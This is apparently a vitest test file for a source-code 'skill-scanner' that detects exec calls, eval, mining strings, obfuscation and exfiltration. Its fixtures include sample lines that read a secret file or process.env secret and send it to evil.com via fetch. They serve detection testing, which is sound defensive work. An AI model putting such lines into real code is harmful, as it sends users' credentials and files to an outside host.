import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { scanSource } from "./skill-scanner.js";

// ---------------------------------------------------------------------------
// Helper — run scanSource and return ruleIds that fired
// ---------------------------------------------------------------------------

function findingIds(source: string, file = "test.ts"): string[] {
  return scanSource(source, file).map((f) => f.ruleId);
}

// ---------------------------------------------------------------------------
// LINE RULES
// ---------------------------------------------------------------------------

describe("LINE_RULES", () => {
  describe("dangerous-exec", () => {
    it("detects exec() with child_process context", () => {
      const src = `import { exec } from "child_process";\nexec("ls");`;
      expect(findingIds(src)).toContain("dangerous-exec");
    });

    it("detects execSync with child_process context", () => {
      const src = `const cp = require("child_process");\ncp.execSync("ls");`;
      expect(findingIds(src)).toContain("dangerous-exec");
    });

    it("detects spawn with child_process context", () => {
      const src = `import { spawn } from "child_process";\nspawn("node", ["index.js"]);`;
      expect(findingIds(src)).toContain("dangerous-exec");
    });

    it("does not fire without child_process context", () => {
      const src = `exec("SELECT 1");`;
      expect(findingIds(src)).not.toContain("dangerous-exec");
    });

    it("does not match unrelated identifiers", () => {
      const src = `const executor = new TaskExecutor();`;
      expect(findingIds(src)).not.toContain("dangerous-exec");
    });
  });

  describe("dynamic-code-execution", () => {
    it("detects eval()", () => {
      expect(findingIds(`eval("1+1");`)).toContain("dynamic-code-execution");
    });

    it("detects new Function()", () => {
      expect(findingIds(`const fn = new Function("return 1");`)).toContain("dynamic-code-execution");
    });

    it("does not match 'evaluate' or similar", () => {
      expect(findingIds(`obj.evaluate(expr);`)).not.toContain("dynamic-code-execution");
    });
  });

  describe("crypto-mining", () => {
    it("detects stratum+tcp", () => {
      expect(findingIds(`const pool = "stratum+tcp://pool.example.com";`)).toContain("crypto-mining");
    });

    it("detects coinhive (case insensitive)", () => {
      expect(findingIds(`// CoinHive reference`)).toContain("crypto-mining");
    });

    it("does not match normal crypto usage", () => {
      expect(findingIds(`import crypto from "node:crypto";`)).not.toContain("crypto-mining");
    });
  });

  describe("suspicious-network", () => {
    it("detects WebSocket on non-standard port", () => {
      expect(findingIds(`new WebSocket("ws://evil.com:9999");`)).toContain("suspicious-network");
    });

    it("does not fire for standard ports", () => {
      expect(findingIds(`new WebSocket("wss://api.example.com:443");`)).not.toContain("suspicious-network");
    });

    it("does not fire for port 3000", () => {
      expect(findingIds(`new WebSocket("ws://localhost:3000");`)).not.toContain("suspicious-network");
    });
  });
});

// ---------------------------------------------------------------------------
// SOURCE RULES
// ---------------------------------------------------------------------------

describe("SOURCE_RULES", () => {
  describe("potential-exfiltration", () => {
    it("detects readFile + fetch combo", () => {
      const src = `const data = readFileSync("secret.txt");\nfetch("https://evil.com", { body: data });`;
      expect(findingIds(src)).toContain("potential-exfiltration");
    });

    it("does not fire for readFile alone", () => {
      const src = `const data = readFileSync("config.json");`;
      expect(findingIds(src)).not.toContain("potential-exfiltration");
    });
  });

  describe("obfuscated-code (hex)", () => {
    it("detects long hex-encoded sequences", () => {
      const hex = "\\x48\\x65\\x6c\\x6c\\x6f\\x21\\x42\\x43";
      expect(findingIds(`const s = "${hex}";`)).toContain("obfuscated-code");
    });

    it("does not fire for short hex sequences", () => {
      const hex = "\\x48\\x65";
      expect(findingIds(`const s = "${hex}";`)).not.toContain("obfuscated-code");
    });
  });

  describe("obfuscated-code (base64)", () => {
    it("detects atob with large payload", () => {
      const payload = "A".repeat(250);
      expect(findingIds(`atob("${payload}");`)).toContain("obfuscated-code");
    });

    it("detects Buffer.from with large payload", () => {
      const payload = "B".repeat(250);
      expect(findingIds(`Buffer.from("${payload}")`)).toContain("obfuscated-code");
    });

    it("does not fire for small base64 payload", () => {
      expect(findingIds(`atob("SGVsbG8=")`)).not.toContain("obfuscated-code");
    });
  });

  describe("env-harvesting", () => {
    it("detects process.env + fetch combo", () => {
      const src = `const key = process.env.SECRET;\nfetch("https://evil.com?key=" + key);`;
      expect(findingIds(src)).toContain("env-harvesting");
    });

    it("does not fire for process.env alone", () => {
      const src = `const port = process.env.PORT || 3000;`;
      expect(findingIds(src)).not.toContain("env-harvesting");
    });
  });
});

// ---------------------------------------------------------------------------
// Self-scan regression test
// ---------------------------------------------------------------------------

describe("self-scan regression", () => {
  it("scanning the scanner's own source produces zero critical findings", () => {
    const scannerPath = path.resolve(__dirname, "skill-scanner.ts");
    const scannerSource = fs.readFileSync(scannerPath, "utf-8");
    const findings = scanSource(scannerSource, "skill-scanner.ts");
    const criticals = findings.filter((f) => f.severity === "critical");
    expect(criticals).toEqual([]);
  });

  it("scanning the scanner's own source produces zero warn findings", () => {
    const scannerPath = path.resolve(__dirname, "skill-scanner.ts");
    const scannerSource = fs.readFileSync(scannerPath, "utf-8");
    const findings = scanSource(scannerSource, "skill-scanner.ts");
    const warns = findings.filter((f) => f.severity === "warn");
    expect(warns).toEqual([]);
  });
});
